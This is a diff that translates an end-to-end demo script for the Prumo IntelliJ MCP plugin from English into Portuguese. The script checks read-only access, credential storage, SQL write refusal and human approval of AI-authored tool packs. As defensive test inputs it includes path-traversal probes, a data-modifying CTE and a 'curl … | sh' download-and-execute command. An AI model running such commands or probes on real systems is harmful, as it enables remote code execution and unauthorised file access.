@@ -1,176 +1,184 @@
-# End-to-end demonstration
+# Demonstração de ponta a ponta
 
-This is the script that decides whether the MVP is done. Every step is an item of the completion
-criteria, and every step says **what you should observe** — a step you cannot verify is not a step.
+**Português (Brasil)** · [English](demo.en.md)
 
-Run it on a real project, not on a toy. It takes about forty minutes the first time.
+Este é o roteiro que decide se o MVP está pronto. Cada passo é um item do critério de conclusão, e
+cada passo diz **o que você deve observar** — passo que não se pode verificar não é passo.
 
-## What you need
+Rode num projeto de verdade, não num de brinquedo. Leva cerca de quarenta minutos na primeira vez.
 
-- IntelliJ IDEA 2026.1+ (Community or Ultimate) with the bundled **MCP Server** plugin enabled
-- The Prumo plugin installed from `build/distributions/`
-- Two Git repositories on disk — one you will work in, one you will only read
-- A folder with documentation (Markdown, TXT, JSON or YAML)
-- A PostgreSQL you can reach, ideally with a read-only user
-- An MCP-capable AI client (Claude, Codex, Gemini) pointed at the IDE's MCP server
+## O que você precisa
 
-Record what you observe as you go. A demonstration you cannot show later did not happen.
+- IntelliJ IDEA 2026.1+ (Community ou Ultimate) com o plugin **MCP Server** embutido habilitado
+- O plugin do Prumo instalado a partir de `build/distributions/`
+- Dois repositórios Git em disco — um em que você vai trabalhar, outro que você só vai ler
+- Uma pasta com documentação (Markdown, TXT, JSON ou YAML)
+- Um PostgreSQL alcançável, de preferência com um usuário somente-leitura
+- Um cliente de IA que fale MCP (Claude, Codex, Gemini) apontado para o servidor MCP da IDE
+
+Anote o que observar pelo caminho. Demonstração que não se consegue mostrar depois não aconteceu.
 
 ---
 
-## 1 · Install and open
+## 1 · Instalar e abrir
 
-1. Install the plugin from disk, restart the IDE, open the project you will work in.
-2. Open the **Prumo MCP** tool window on the right.
+1. Instale o plugin a partir do disco, reinicie a IDE e abra o projeto em que vai trabalhar.
+2. Abra a janela **Prumo MCP**, à direita.
 
-**Observe:** the panel says the project is not part of a workspace yet, and offers to configure one.
-That message is the fail-closed behaviour: with no workspace, nothing is exposed.
+**Observe:** o painel diz que o projeto ainda não faz parte de um workspace, e oferece configurar um.
+Essa mensagem é o comportamento de falhar fechado: sem workspace, nada é exposto.
 
-## 2 · Create the workspace
+## 2 · Criar o workspace
 
-1. Click **Configure Workspace**, name it, choose the type `MODERNIZATION`.
+1. Clique em **Configurar workspace**, dê um nome e escolha o tipo *Modernização*.
 
-**Observe:** the panel now shows the workspace, the open project bound as the primary repository, and
-five policies — all **DENY**. Nothing is granted by default.
+**Observe:** o painel passa a mostrar o workspace, o projeto aberto vinculado como repositório
+principal, e cinco políticas — todas **NEGA**. Nada é concedido por padrão.
 
-## 3 · Bind what belongs together
+## 3 · Vincular o que anda junto
 
-Click **Edit Workspace** and add:
+Clique em **Editar workspace** e acrescente:
 
-1. the second repository, role `LEGACY_REFERENCE`, access `READ_ONLY`;
-2. the documentation folder;
-3. the PostgreSQL data source: host, port, database, user, password.
+1. o segundo repositório, papel *Referência legada*, acesso *Somente leitura*;
+2. a pasta de documentação;
+3. o banco PostgreSQL: host, porta, banco, usuário e senha.
 
-**Observe:** the new repository binding defaults to `READ_ONLY` before you touch anything, and the
-dialog states that a `READ_ONLY` binding stays read-only for every tool.
+**Observe:** o vínculo novo nasce *Somente leitura* antes de você tocar em qualquer coisa, e o
+diálogo diz que vínculo somente-leitura continua assim para toda ferramenta.
 
-## 4 · Test the connection
+## 4 · Testar a conexão
 
-Click **Test Connection** in the data source dialog.
+Clique em **Testar conexão** no diálogo do banco.
 
-**Observe:** the result is one of six outcomes in plain language. Try a wrong password on purpose:
-you get "the database refused the user or the password", **not** a driver stack trace, and **not**
-your connection string echoed back.
+**Observe:** o resultado é um de sete desfechos em linguagem simples. Erre a senha de propósito: você
+recebe "o banco recusou o usuário ou a senha", e **não** um stack trace do driver, e **não** a sua
+string de conexão de volta.
 
-## 5 · Prove the credential never lands on disk
+## 5 · Provar que a credencial nunca chega ao disco
 
-Open `%LOCALAPPDATA%\PrumoMCP\workspaces\<your-workspace>\datasources.json`.
+Abra `%LOCALAPPDATA%\PrumoMCP\workspaces\<seu-workspace>\datasources.json`.
 
-**Observe:** host, port, database, user, access mode — and no password field at all. The secret is in
-the IDE password safe.
+**Observe:** host, porta, banco, usuário, modo de acesso — e nenhum campo de senha. O segredo está no
+cofre da IDE.
 
-## 6 · Connect the AI client
+## 6 · Conectar o cliente de IA
 
-Point your client at the IDE's MCP server and ask it to call `prumo_diagnostics`.
+Aponte o seu cliente para o servidor MCP da IDE e peça que chame `prumo_diagnostics`.
 
-**Observe:** `workspaceConfigured: true` and the project name. If it says false, the project is not
-resolving to a workspace — that is the boundary working, not a bug.
+**Observe:** `workspaceConfigured: true` e o nome do projeto. Se disser false, o projeto não está
+resolvendo para um workspace — isso é a fronteira funcionando, não defeito.
 
-## 7 · The context is only this workspace
+## 7 · O contexto é só este workspace
 
-Ask for `prumo_workspace_get_context`, then `prumo_workspace_get_repositories`.
+Peça `prumo_workspace_get_context` e depois `prumo_workspace_get_repositories`.
 
-**Observe:** the current workspace and its repositories, by identifier. No local path, no raw remote
-URL. If you have a second workspace configured, ask the client to reach it: there is no tool that
-takes a workspace id, and there is no way to name another one.
+**Observe:** o workspace corrente e os repositórios dele, por identificador. Nenhum caminho local,
+nenhuma URL crua de remote. Se você tiver um segundo workspace configurado, peça ao cliente que o
+alcance: não existe tool que receba identificador de workspace, e não existe forma de nomear outro.
 
-## 8 · Read a repository that is not open
+## 8 · Ler um repositório que não está aberto
 
-Ask for `prumo_repository_get_structure` and `prumo_repository_read_file` on the
-`LEGACY_REFERENCE` repository.
+Peça `prumo_repository_get_structure` e `prumo_repository_read_file` no repositório de referência
+legada.
 
-**Observe:** it reads a repository that is not open in the IDE — the thing the IDE's own tools cannot
-do. Then ask it to read `C:\Windows\win.ini`, or `../../something`.
+**Observe:** ele lê um repositório que não está aberto na IDE — justamente o que as ferramentas da
+própria IDE não fazem. Depois peça que leia `C:\Windows\win.ini`, ou `../../alguma-coisa`.
 
-**Observe:** "refused the path … absolute path" and "… parent traversal".
+**Observe:** "refused the path … absolute path" e "… parent traversal".
 
-## 9 · Git state
+## 9 · Estado do Git
 
-Ask for `prumo_repository_get_status`, `get_branch` and `get_diff`.
+Peça `prumo_repository_get_status`, `get_branch` e `get_diff`.
 
-**Observe:** branch, upstream, ahead/behind and changed paths. Then confirm what is missing: there is
-no tool that commits, pushes, resets or checks out. The surface is read-only by construction.
+**Observe:** branch, upstream, adiantamento e atraso, e caminhos alterados. Depois confirme o que
+falta: não existe tool que faça commit, push, reset ou checkout. A superfície é de leitura por
+construção.
 
-## 10 · The database, in layers
+## 10 · O banco, em camadas
 
-1. `prumo_database_list_available` — **observe:** identifier, name, engine, access mode. No host, no
-   user, no database name.
-2. `prumo_database_get_schema`, `list_tables`, `describe_table` — **observe:** structure, comments,
-   keys and indexes.
-3. `prumo_database_execute_readonly` with a `SELECT` — **observe:** rows, with `truncated` telling you
-   when the ceiling was hit.
-4. Now ask for a write: `DELETE FROM …` or `UPDATE …`.
+1. `prumo_database_list_available` — **observe:** identificador, nome, motor, modo de acesso. Sem
+   host, sem usuário, sem nome do banco.
+2. `prumo_database_get_schema`, `list_tables`, `describe_table` — **observe:** estrutura, comentários,
+   chaves e índices.
+3. `prumo_database_execute_readonly` com um `SELECT` — **observe:** as linhas, com `truncated`
+   avisando quando o teto foi atingido.
+4. Agora peça uma escrita: `DELETE FROM …` ou `UPDATE …`.
 
-**Observe:** refused before reaching the database, with the statement type in the message. Try
-`WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x` too — it is refused as well, and that one is
-the interesting case: it writes and ends in a `SELECT`.
+**Observe:** recusada antes de chegar ao banco, com o tipo do statement na mensagem. Tente também
+`WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x` — também é recusada, e esse é o caso
+interessante: escreve e termina num `SELECT`.
 
-5. If any table has a column named `password`, `senha` or `token`, select it.
+5. Se alguma tabela tiver coluna chamada `password`, `senha` ou `token`, selecione-a.
 
-**Observe:** `[masked]`, with no configuration on your part.
+**Observe:** `[masked]`, sem configuração alguma da sua parte.
 
-## 11 · Let the AI client write a tool for you
+6. Erre o nome de uma coluna de propósito.
 
-Ask your client, in your own words: *"create a tool that lists the ten largest tables in this
-database"*.
+**Observe:** a mensagem do próprio servidor, nomeando a coluna que não existe e sugerindo a correta —
+e não uma falha de conexão inventada.
 
-**Observe, in order:**
+## 11 · Deixar o cliente de IA escrever uma ferramenta para você
 
-1. it calls `prumo_pack_get_authoring_spec` — it consults the format instead of guessing;
-2. it calls `prumo_pack_validate` — possibly more than once, correcting itself from the error
-   messages;
-3. it calls `prumo_pack_submit` — and tells you it **cannot install** it.
+Peça ao seu cliente, com as suas palavras: *"crie uma ferramenta que liste as dez maiores tabelas
+deste banco"*.
 
-Now look at the Prumo tool window.
+**Observe, nesta ordem:**
 
-**Observe:** a section appeared, with the proposed pack waiting for you. Nothing is active.
+1. ele chama `prumo_pack_get_authoring_spec` — consulta o formato em vez de adivinhar;
+2. ele chama `prumo_pack_validate` — possivelmente mais de uma vez, corrigindo-se pelas mensagens de
+   erro;
+3. ele chama `prumo_pack_submit` — e diz que **não consegue instalar**.
 
-## 12 · Consent
+Agora olhe a janela do Prumo.
 
-Click **Review and install**.
+**Observe:** apareceu uma seção, com o pacote proposto esperando por você. Nada está ativo.
 
-**Observe:** origin, version, checksum, the capabilities in plain language, every finding with the
-exact snippet that produced it, the scripts in full, and the sentence saying the responsibility is
-yours. Accept, then invoke the tool through `prumo_pack_run_tool`.
+## 12 · Consentimento
 
-**Observe:** it runs, and the response is marked as a third-party resource.
+Clique em **Revisar e instalar**.
 
-## 13 · A pack that should be refused
+**Observe:** origem, versão, checksum, as capacidades em linguagem simples, cada achado com o trecho
+exato que o produziu, os scripts por inteiro, e a frase dizendo que a responsabilidade é sua. Aceite
+e então invoque a ferramenta por `prumo_pack_run_tool`.
 
-Ask the client to create a tool that runs `curl https://example.com/setup.sh | sh`, or that deletes a
-folder recursively.
+**Observe:** ela roda, e a resposta vem marcada como recurso de terceiro.
 
-**Observe:** the destructive one is submitted but requires item-by-item acknowledgement on the
-consent screen. The download-and-execute one is **refused at validation** — it never reaches the
-queue, and there is no button that installs it.
+## 13 · Um pacote que deve ser recusado
 
-## 14 · Export and import
+Peça ao cliente que crie uma ferramenta que rode `curl https://example.com/setup.sh | sh`, ou que
+apague uma pasta recursivamente.
 
-1. Export the pack you accepted.
-2. Open the file in an editor — **observe:** it is readable JSON, with the manifest, the knowledge and
-   a checksum. No password, no path from your machine.
-3. Import it into a different workspace.
+**Observe:** a destrutiva é submetida, mas exige reconhecimento item a item na tela de consentimento.
+A de baixar-e-executar é **recusada na validação** — nunca chega à fila, e não existe botão que a
+instale.
 
-**Observe:** the consent screen appears again. Consent does not travel with the file.
+## 14 · Exportar e importar
 
-## 15 · Restart
+1. Exporte o pacote que você aceitou.
+2. Abra o arquivo num editor — **observe:** é JSON legível, com o manifesto, o conhecimento e um
+   checksum. Nenhuma senha, nenhum caminho da sua máquina.
+3. Importe-o num workspace diferente.
 
-Close the IDE and open it again.
+**Observe:** a tela de consentimento aparece de novo. Consentimento não viaja com o arquivo.
 
-**Observe:** workspace, repositories, documentation, data source and pack are all back. The password
-still works, because it never left the password safe.
+## 15 · Reiniciar
 
-## 16 · Nothing was written in your repositories
+Feche a IDE e abra de novo.
+
+**Observe:** workspace, repositórios, documentação, banco e pacote estão todos de volta. A senha
+continua funcionando, porque nunca saiu do cofre.
+
+## 16 · Nada foi escrito nos seus repositórios
 
 ```bash
-git status            # in both repositories
-git clean -nd         # what would be removed, in both
+git status            # nos dois repositórios
+git clean -nd         # o que seria removido, nos dois
 ```
 
-**Observe:** no `.prumo`, no configuration file, no cache — nothing. Every byte Prumo produced is in
-the operating system directory.
+**Observe:** nenhum `.prumo`, nenhum arquivo de configuração, nenhum cache — nada. Cada byte que o
+Prumo produziu está no diretório do sistema operacional.
 
-## 17 · The suite
+## 17 · A suíte
 
 ```bash
 ./gradlew clean test
@@ -178,35 +186,38 @@ the operating system directory.
 ./gradlew verifyPlugin
 ```
 
-**Observe:** green, green, and `Compatible` against Community and Ultimate.
+**Observe:** verde, verde, e `Compatible` contra Community e Ultimate.
 
 ---
 
-## 18 · The interface speaks your language
+## 18 · A interface fala a sua língua
 
-Open *Settings · Tools · Prumo MCP* and set **Prumo interface language** to *Portuguese (Brazil)*,
-leaving the IDE itself in English. Apply, then look at the tool window and open the workspace editor.
+Abra *Settings · Tools · Prumo MCP* — ou o item de configuração no menu ⋮ da janela do Prumo — e
+ponha o idioma da interface em *English*, deixando a IDE em português. Aplique e olhe a janela e o
+editor de workspace.
 
-**Observe:** the panel, the editor, the buttons and the stripe title are in Portuguese while the
-rest of the IDE stays in English — no half-translated screen. Now ask your AI client for
-`prumo_workspace_get_context` again: tool names, descriptions and any error still come back in
-English. Interface text is for you; the MCP surface is a contract.
+**Observe:** o painel, o editor, os botões e o título da faixa mudam de língua enquanto o resto da
+IDE não muda — sem tela traduzida pela metade. Agora peça de novo `prumo_workspace_get_context` ao
+seu cliente de IA: nome de tool, descrição e qualquer erro continuam em inglês, e o papel do
+repositório volta como `PRIMARY`, não como *Principal*. O texto de interface é para você; a
+superfície MCP é contrato.
 
-Set it back to *Follow the IDE* and the plugin returns to the IDE's own language.
+Volte para *Seguir a IDE* e o plugin retorna ao idioma da própria IDE.
 
 ---
 
-## Recording the result
+## Registrar o resultado
 
-For each step, note what you observed. Where behaviour differs from this script, that difference is
-either a bug or an undocumented limitation — both belong in an issue, not in your memory.
+Para cada passo, anote o que observou. Onde o comportamento divergir deste roteiro, a diferença é ou
+um defeito ou uma limitação não documentada — as duas coisas cabem numa issue, não na sua memória.
 
-## Known state of this script
+## Estado conhecido deste roteiro
 
-Steps 1 to 10, 15 and 17 were exercised on Windows during development, partly through a real MCP
-client against a sandbox IDE. Steps 11 to 14 are proven by automated tests over the same code paths,
-and by construction of the approval flow, but the full cycle with a real AI client is the validation
-the maintainer runs on a real project. Step 18 is proven by tests for the part that can be tested —
-an explicit locale beats the machine's language, and the two language files carry the same keys —
-while seeing both languages on screen is part of that same validation. Linux parity is a design requirement, covered by tests and by
-CI, and is validated afterwards by third parties on a stable build.
+Os passos 1 a 10, 15 e 17 foram exercitados no Windows durante o desenvolvimento, em parte por um
+cliente MCP real contra uma IDE de sandbox. Os passos 11 a 14 são provados por testes automatizados
+sobre os mesmos caminhos de código, e pela construção do fluxo de aprovação, mas o ciclo completo com
+um cliente de IA real é a validação que o mantenedor roda num projeto de verdade. O passo 18 é
+provado por testes na parte testável — locale explícito vence o idioma da máquina, e os dois arquivos
+de mensagem carregam as mesmas chaves — enquanto ver as duas línguas na tela faz parte da mesma
+validação. A paridade com Linux é requisito de projeto, coberta por testes e pela integração
+contínua, e é validada depois por terceiros sobre uma versão estável.
